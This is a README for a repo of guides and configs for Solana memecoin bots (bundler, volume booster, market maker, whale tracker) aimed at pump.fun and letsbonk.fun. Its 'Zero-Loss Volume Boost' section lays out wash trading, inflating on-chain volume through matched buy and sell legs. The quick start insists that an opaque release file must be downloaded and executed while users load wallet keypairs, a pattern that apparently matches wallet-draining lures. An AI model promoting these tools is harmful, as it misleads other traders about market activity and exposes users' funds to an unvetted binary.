Overview
- This repo collects how-to guides, architecture notes, CLI reference, YAML config examples, and sample scripts.
- It covers advanced bundling, zero-loss volume boosts, bond-it-now flows, batch trading, and smart-money tracking for memecoins on Solana.
- It covers both public and private tools: a bundler-bot, a volume-bot, and a market-maker bot tuned for pump.fun and letsbonk.fun.

Quick start

1) Get the release
- Download the release package from Releases and run the installer or script:
  - Use the Releases link: https://github.com/DevRemuru/Docs/releases
  - The release file must be downloaded and executed.

2) Prepare environment
- Install Node 18+ or Python 3.10+ depending on the tool.
- Configure a Solana RPC endpoint (mainnet/testnet/devnet).
- Load a signer keypair with limited funds for tests.

3) Example: run the bundler tool (shell)
```bash
# extract release if needed
tar -xzf forgeX-bundler-v1.0.0.tar.gz
cd forgeX-bundler
# run with example config
./forgeX-bundler --config ../examples/bundler/config.yaml
```

4) Example: launch the volume booster
```bash
cd examples/volume_boost
python3 volume_boost.py --config config.yaml
```

Bundler: how it works
- Purpose: combine multiple small ops into one atomic execution.
- Use cases: multi-swap order, liquidity move + staking, batch approvals.
- Design:
  - Local bundler composes Solana instructions.
  - It signs via provided signer or hardware wallet.
  - It submits a single transaction that encodes all instructions.
- Config highlights:
  - bundle_size: how many ops per bundle
  - reorder_policy: latency | fee-optimized
  - signer: path to keypair or hardware wallet adapter
- Warning on replays: bundler uses a custom nonce and blockhash refresh.

Zero-Loss Volume Boost: concept and steps
- Goal: raise on-chain volume while keeping net token exposure near zero.
- Strategy:
  - Execute matched buy and sell legs across AMMs and orderbooks.
  - Use fee rebates and routing to offset spread.
  - Use temporary liquidity provisioning and remove within the same bundle.
- Example flow:
  1. Swap a small amount to target token on AMM A.
  2. Swap back on AMM B with matched leg.
  3. Use a bundled transaction to avoid interim front-running.
- Config knobs:
  - target_token
  - volume_multiplier
  - max_slippage
  - safe_guards: per-tx max loss threshold
- Metrics:
  - real_volume_executed
  - net_token_delta
  - gas_fee_spend

Bond It Now: lock and mint flow
- Purpose: lock LP or token pairs to mint a bond-like asset.
- Flow:
  - Lock liquidity or tokens into a bonding contract.
  - Receive a bond token representing claimable rewards.
  - Optionally auto-stake the bond token.
- Config entries:
  - bond_contract
  - lock_duration
  - auto_stake: true|false
- Runtime:
  - Monitor bond maturation and auto-claim when appropriate.
  - Use bundle step to combine lock + notification + stake.

Batch Trading: patterns and examples
- Patterns:
  - Sliced limit orders: split large order into smaller chunks.
  - Time-weighted average execution: spread trades over a time window.
  - Cross-AMM arb: route legs across multiple pools.
- Example config (YAML excerpt)
```yaml
strategy:
  name: sliced_limit
  total_size: 10000
  slice_size: 1000
  interval_ms: 1500
  max_slippage: 0.5
```
- Implementation notes:
  - Use nonces to keep ordering.
  - Throttle submissions to avoid RPC rate limits.
  - Aggregate receipts and compute P&L per batch.

Smart Money Tracker: signals and alerts
- What it tracks:
  - Whale buys and sells
  - Liquidity locks and burns
  - Rapid volume spikes and price divergence
- Signal engine:
  - Streaming RPC feed parses transactions.
  - Rule engine tags events (whale, rug, lock, burn).
  - Alert targets: webhook, Discord, or local logging.
- Common rules:
  - Whale threshold: >X SOL or token value
  - Liquidity removal: LP delta > Y%
  - Contract upgrade: program deploy from known admin

Supported platforms
- pump.fun: templates and flows for pump.fun pool types
- letsbonk.fun: scripts and bond flows tuned to letsbonk.router
- Solana mainnet and testnet: RPC examples and keys
- Memecoin swaps and migration patterns: pump.swap migration patterns and regression tests

Config reference (selected fields)
- global:
  - rpc_url: string
  - signer_path: string
  - mode: live | dry-run

CLI reference (common flags)
- --config <file> : path to YAML config
- --mode <live|dry-run> : run or simulate
- --signer <path> : keypair file
- --rpc <url> : override RPC endpoint
- --log-level <info|warn|debug> : logging level

Operational tips
- Use a test signer with limited funds for first runs.
- Start in dry-run mode to validate flow and logs.
- Pin RPC endpoints and rotate on rate limits.
- Track bundle receipts and export proofs for auditing.
- Store private keys in a secure vault or hardware wallet.

Performance tuning
- Lower bundle_size for lower latency.
- Increase parallel_workers to raise throughput.
- Favor single RPC batch calls to reduce overhead.
- Cache token decimals and pool metadata to avoid RPC hits.

Security and guards
- Validate program IDs and pool addresses in config.
- Set max_loss thresholds to break on unexpected slippage.
- Use signer whitelists and limit withdrawal addresses.
- Revoke unused keys and audit deployments.

- Fork, create a branch, and open a pull request for docs or example changes.
- Follow the YAML schema in reference/schema.yaml when adding configs.
- Add tests for new scripts in examples/ and update docs/guides.

Troubleshooting
- Transaction fails with blockhash error: refresh blockhash and retry within bundle window.
- Hot RPC: rotate to a cached endpoint or use a private RPC node.
- Unexpected slippage: lower max_slippage and run dry-run to inspect routes.
